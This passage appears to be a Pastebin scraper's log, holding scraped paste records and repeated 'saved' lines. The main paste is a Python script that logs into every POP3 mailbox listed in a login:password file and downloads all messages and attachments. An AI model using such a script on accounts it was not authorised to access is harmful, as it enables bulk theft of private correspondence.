os.mkdir(""{}"".format(i))\n\xa0 \xa0 for message in pop3server.retr(i+1)[1]:\n\xa0 \xa0 \xa0 \xa0 my_file = open(""{}/mail{}.txt"".format(i,i), ""a"")\n\xa0 \xa0 \xa0 \xa0 my_file.write(str(message) + ""\\n"")\n\xa0 \xa0 print(""*************************************************************************************************"")\n\xa0 \xa0 \xa0 \xa0 \n\xa0\npop3server.quit()', date='2022-06-01 06:58:04 +00:00', hash_val='82d04af5c9c0649a9ef281803642d091', url='/qzNiTNTG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='askanton', title='Забираем всі листи та вкладення з поштового ящика по протоколу pop3', content='import poplib\nfrom email.parser import BytesParser\nfrom email.policy import default\nimport os\n\xa0\nf = open(""accounts.txt"") \xa0# читаємо файл з аккаунтами\naccs = f.readlines()\nf.close()\ni = 0\n#print(accs)\n\xa0\n\xa0\ndef check(login, passwd): \xa0# описуємо основну функію\n\xa0 \xa0 file_path = str(login)\n\xa0 \xa0 os.mkdir(""{}"".format(file_path)) \xa0# створюемо папки для пошт\n\xa0 \xa0 pop = poplib.POP3(\'0.0.0.0\') \xa0# конектимся до пошти\n\xa0 \xa0 pop.user(login)\n\xa0 \xa0 pop.pass_(passwd)\n\xa0 \xa0 #print(pop.getwelcome())\n\xa0 \xa0 stat = pop.stat()\n\xa0 \xa0 list_count = int(stat[0])\n\xa0 \xa0 print(""Total mails: "", list_count)\n\xa0 \xa0 mailcount = pop.list() \xa0# рахуємо кількість листів\n\xa0 \xa0 if list_count != 0:\n\xa0 \xa0 \xa0 \xa0 text_count, img_count, pdf_count, html_count = 0, 0, 0, 0\n\xa0 \xa0 \xa0 \xa0 for k in range(1, list_count): \xa0# перебираємо всі листи\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 r = pop.retr(k)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(k)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 bp = BytesParser(policy=default).parsebytes(b\'\\r\\n\'.join(r[1])) \xa0# парсимо вміст отриманного листа\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for part in bp.walk(): \xa0# відділяємо різні типи вмісту\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if part.get_content_type() == \'text/plain\': \xa0# текст\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 message = part.get_content()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 my_file = open(""{}/text_{}.txt"".format(file_path, text_count), ""a"", encoding=""utf-8"") \xa0# записуемо лист в папку\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 my_file.write(message)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 text_count = text_count + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(""text/plain - done"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if part.get_content_type() == \'text/html\': \xa0# html\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 message = part.get_content()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 my_file = open(""{}/html_{}.html"".format(file_path, html_count), ""a"", encoding=""utf-8"") \xa0# записуемо лист в папку\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 my_file.write(message)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 html_count = html_count + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(""text/html - done"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if part.get_content_type() == \'image/jpeg\': \xa0# jpeg\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 message = part.get_payload(decode=True)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 with open(""{}/img_{}.jpg"".format(file_path, img_count), \'wb\') as f:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 f.write(part.get_payload(decode=True))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 img_count = img_count + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(""image/jpeg - done"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if part.get_content_type() == \'application/pdf\': \xa0# pdf\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 message = part.get_payload(decode=True)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 with open(""{}/pdf_{}.pdf"".format(file_path, pdf_count), \'wb\') as f:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 f.write(part.get_payload(decode=True))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pdf_count = pdf_count + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(""application/pdf"")\n\xa0\n\xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 print(""No messages"")\n\xa0\nfor acc in accs: \xa0# перебираемо поштові аккаунти\n\xa0 \xa0 i = i + 1\n\xa0 \xa0 acc = acc.replace(\'\\n\', \'\')\n\xa0 \xa0 acc = acc.replace(\' \', \'\')\n\xa0 \xa0 acc = acc.split(\':\')\n\xa0\n\xa0 \xa0 if len(acc) == 2: \xa0# запускаем перевірку\n\xa0 \xa0 \xa0 \xa0 print(acc)\n\xa0 \xa0 \xa0 \xa0 check(acc[0], acc[1])\n\xa0 \xa0 \xa0 \xa0 print(""************************************************************************"")', date='2022-06-01 06:56:28 +00:00', hash_val='2259c47d817d189bef06a60b6e2ee3d6', url='/ffPhUYtR', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')})]
2022-06-01T17:08:34.832029+0300 INFO [PASTEBIN]    saved /kEQRsKq0 
2022-06-01T17:08:34.832612+0300 INFO [PASTEBIN]    saved /XJ1Tt0Dd 
2022-06-01T17:08:34.833055+0300 INFO [PASTEBIN]    saved /2nz8WBMX 
2022-06-01T17:08:34.833474+0300 INFO [PASTEBIN]    saved /XxXav8r9 
2022-06-01T17:08:34.832029+0300 INFO [PASTEBIN]    saved /kEQRsKq0 
2022-06-01T17:08:34.833891+0300 INFO [PASTEBIN]    saved /sAgz7Jas 
2022-06-01T17:08:34.834308+0300 INFO [PASTEBIN]    saved /6XtvDpbC 
2022-06-01T17:08:34.832612+0300 INFO [PASTEBIN]    saved /XJ1Tt0Dd 
2022-06-01T17:08:34.833055+0300 INFO [PASTEBIN]    saved /2nz8WBMX 
2022-06-01T17:08:34.833474+0300 INFO [PASTEBIN]    saved /XxXav8r9 
2022-06-01T17:08:34.833891+0300 INFO [PASTEBIN]    saved /sAgz7Jas 
2022-06-01T17:08:34.836215+0300 INFO [PASTEBIN]    saved /S6BumVkC 
2022-06-01T17:08:34.834308+0300 INFO [PASTEBIN]    saved /6XtvDpbC 
2022-06-01T17:08:34.836215+0300 INFO [PASTEBIN]    saved /S6BumVkC 
2022-06-01T17:08:34.837174+0300 INFO [PASTEBIN]    saved /nFymAiMC 
2022-06-01T17:08:34.838157+0300 INFO [PASTEBIN]    saved /CFxHbqkU 
2022-06-01T17:08:34.837174+0300 INFO [PASTEBIN]    saved /nFymAiMC 
2022-06-01T17:08:34.838678+0300 INFO [PASTEBIN]    saved /vAC6sJ5X 
2022-06-01T17:08:34.838157+0300 INFO [PASTEBIN]    saved /CFxHbqkU 
2022-06-01T17:08:34.838678+0300 INFO [PASTEBIN]    saved /vAC6sJ5X 
2022-06-01T17:08:34.839297+0300 INFO [PASTEBIN]    saved /EbtiverJ 
2022-06-01T17:08:34.839297+0300 INFO [PASTEBIN]    saved /EbtiverJ 
2022-06-01T17:08:34.840031+0300 INFO [PASTEBIN]    saved /a22PZrCN 
2022-06-01T17:08:34.840031+0300 INFO [PASTEBIN]    saved /a22PZrCN 
2022-06-01T17:08:34.840674+0300 INFO [PASTEBIN]    saved /xQHPkXSh 
2022-06-01T17:08:34.840674+0300 INFO [PASTEBIN]    saved /xQHPkXSh 
2022-06-01T17:08:34.841373+0300 INFO [PASTEBIN]    saved /KkH3NTqf 
2022-06-01T17:08:34.841373+0300 INFO [PASTEBIN]    saved /KkH3NTqf 
2022-06-01T17:08:34.841920+0300 INFO [PASTEBIN]    saved /A5PrM16v 
2022-06-01T17:08:34.841920+0300 INFO [PASTEBIN]    saved /A5PrM16v 
2022-06-01T17:08:34.842417+0300 INFO [PASTEBIN]    saved /27LLDR46 
2022-06-01T17:08:34.842852+0300 INFO [PASTEBIN]    saved /QLzUVVFP 
2022-06-01T17:08:34.843520+0300 INFO [PASTEBIN]    saved /3Gh74aqt 
2022-06-01T17:08:34.844034+0300 INFO [PASTEBIN]    saved /3uzkDY3Q 
2022-06-01T17:08:34.842417+0300 INFO [PASTEBIN]    saved /27LLDR46 
2022-06-01T17:08:34.842852+0300 INFO [PASTEBIN]    saved /QLzUVVFP 
2022-06-01T17:08:34.843520+0300 INFO [PASTEBIN]    saved /3Gh74aqt 
2022-06-01T17:08:34.844444+0300 INFO [PASTEBIN]    saved /Sw34xvVF 
2022-06-01T17:08:34.844034+0300 INFO [PASTEBIN]    saved /3uzkDY3Q 
2022-06-01T17:08:34.844444+0300 INFO [PASTEBIN]    saved /Sw34xvVF 
2022-06-01T17:08:34.844795+0300 INFO [PASTEBIN]    saved /zcntj0cc 
2022-06-01T17:08:34.844795+0300 INFO [PASTEBIN]    saved /zcntj0cc 
2022-06-01T17:08:34.845935+0300 INFO [PASTEBIN]    saved /meip76d6 
2022-06-01T17:08:34.845935+0300 INFO [PASTEBIN]    saved /meip76d6 
2022-06-01T17:08:34.846454+0300 INFO [PASTEBIN]    saved /SxuLkrXK 
2022-06-01T17:08:34.846454+0300 INFO [PASTEBIN]    saved /SxuLkrXK 
2022-06-01T17:08:34.847210+0300 INFO [PASTEBIN]    saved /yyXjmkkd 
2022-06-01T17:08:34.847210+0300 INFO [PASTEBIN]    saved /yyXjmkkd 
2022-06-01T17:08:34.847846+0300 INFO [PASTEBIN]    saved /me0WmRP2 
2022-06-01T17:08:34.847846+0300 INFO [PASTEBIN]    saved /me0WmRP2 
2022-06-01T17:08:34.848631+0300 INFO [PASTEBIN]    saved /cGVcumWu 
2022-06-01T17:08:34.848631+0300 INFO [PASTEBIN]    saved /cGVcumWu 
2022-06-01T17:08:34.849314+0300 INFO [PASTEBIN]    saved /Eb9uukQC 
2022-06-01T17:08:34.849314+0300 INFO [PASTEBIN]    saved /Eb9uukQC 
2022-06-01T17:08:34.849883+0300 INFO [PASTEBIN]    saved /1c8LP5ed 
2022-06-01T17:08:34.849883+0300 INFO [PASTEBIN]    saved /1c8LP5ed 
2022-06-01T17:08:34.850462+0300 INFO [PASTEBIN]    saved /265imbAB 
2022-06-01T17:08:34.851035+0300 INFO [PASTEBIN]    saved /HmxfrnRy 
2022-06-01T17:08:34.850462+0300 INFO [PASTEBIN]    saved /265imbAB 
2022-06-01T17:08:34.851035+0300 INFO [PASTEBIN]    saved /HmxfrnRy 
2022-06-01T17:08:34.851412+0300 INFO [PASTEBIN]    saved /CtwGnkGJ 
2022-06-01T17:08:34.851412+0300 INFO [PASTEBIN]    saved /CtwGnkGJ 
2022-06-01T17:08:34.851827+0300 INFO [PASTEBIN]    saved /RcUN0MQm 
2022-06-01T17:08:34.851827+0300 INFO [PASTEBIN]    saved /RcUN0MQm 
2022-06-01T17:08:34.852704+0300 INFO [PASTEBIN]    saved /Ne4dJZVF 
2022-06-01T17:08:34.852704+0300 INFO [PASTEBIN]    saved /Ne4dJZVF 
2022-06-01T17:08:34.853284+0300 INFO [PASTEBIN]    saved /QtqFRCg5 
2022-06-01T17:08:34.853839+0300 INFO [PASTEBIN]    saved /C4b3ZKSG 
2022-06-01T17:08:34.853284+0300 INFO [PASTEBIN]    saved /QtqFRCg5 
2022-06-01T17:08:34.853839+0300 INFO [PASTEBIN]    saved /C4b3ZKSG 
2022-06-01T17:08:34.854297+0300 INFO [PASTEBIN]    saved /WDAvn4HM 
2022-06-01T17:08:34.854297+0300 INFO [PASTEBIN]    saved /WDAvn4HM 
2022-06-01T17:08:34.855078+0300 INFO [PASTEBIN]    saved /n3KceSd6 
2022-06-01T17:08:34.855078+0300 INFO [PASTEBIN]    saved /n3KceSd6 
2022-06-01T17:08:34.855641+0300 INFO [PASTEBIN]    saved /pUcaN6zw 
2022-06-01T17:08:34.855641+0300 INFO [PASTEBIN]    saved /pUcaN6zw 
2022-06-01T17:08:34.856060+0300 INFO [PASTEBIN]    saved /qdR5zyy2 
2022-06-01T17:08:34.856060+0300 INFO [PASTEBIN]    saved /qdR5zyy2 
2022-06-01T17:08:34.856678+0300 INFO [PASTEBIN]    saved /rcX9dTCJ 
2022-06-01T17:08:34.856678+0300 INFO [PASTEBIN]    saved /rcX9dTCJ 
2022-06-01T17:08:34.857409+0300 INFO [PASTEBIN]    saved /2iPjcm3r 
2022-06-01T17:08:34.857409+0300 INFO [PASTEBIN]    saved /2iPjcm3r 
2022-06-01T17:08:34.857996+0300 INFO [PASTEBIN]    saved /srQ8CL61 
2022-06-01T17:08:34.857996+0300 INFO [PASTEBIN]    saved /srQ8CL61 
2022-06-01T17:08:34.858600+0300 INFO [PASTEBIN]    saved /r0EmaSbG 
2022-06-01T17:08:34.858600+0300 INFO [PASTEBIN]    saved /r0EmaSbG 
2022-06-01T17:08:34.859164+0300 INFO [PASTEBIN]    saved /CYkqZSc5 
2022-06-01T17:08:34.859164+0300 INFO [PASTEBIN]    saved /CYkqZSc5 
2022-06-01T17:08:34.859820+0300 INFO [PASTEBIN]    saved /qAebbKk4 
2022-06-01T17:08:34.859820+0300 INFO [PASTEBIN]    saved /qAebbKk4 
2022-06-01T17:08:34.860342+0300 INFO [PASTEBIN]    saved /A2nuM6yG 
2022-06-01T17:08:34.860342+0300 INFO [PASTEBIN]    saved /A2nuM6yG 
2022-06-01T17:08:34.860938+0300 INFO [PASTEBIN]    saved /10iPX6E0 
2022-06-01T17:08:34.860938+0300 INFO [PASTEBIN]    saved /10iPX6E0 
2022-06-01T17:08:34.861495+0300 INFO [PASTEBIN]    saved /VMpNcgiY 
2022-06-01T17:08:34.861495+0300 INFO [PASTEBIN]    saved /VMpNcgiY 
2022-06-01T17:08:34.862180+0300 INFO [PASTEBIN]    saved /qzNiTNTG 
2022-06-01T17:08:34.862180+0300 INFO [PASTEBIN]    saved /qzNiTNTG 
2022-06-01T17:08:34.862736+0300 INFO [PASTEBIN]    saved /ffPhUYtR 
2022-06-01T17:08:34.862736+0300 INFO [PASTEBIN]    saved /ffPhUYtR 
2022-06-01T17:08:34.962584+0300 DEBUG debug-test
2022-06-01T17:08:34.962584+0300 DEBUG debug-test
2022-06-01T17:08:35.070586+0300 INFO info-test
2022-06-01T17:08:35.070586+0300 INFO info-test
2022-06-01T17:23:13.712207+0300 INFO [PASTEBIN] got 50 new tasks
2022-06-01T17:23:13.797098+0300 DEBUG debug-test
2022-06-01T17:23:13.903403+0300 INFO info-test
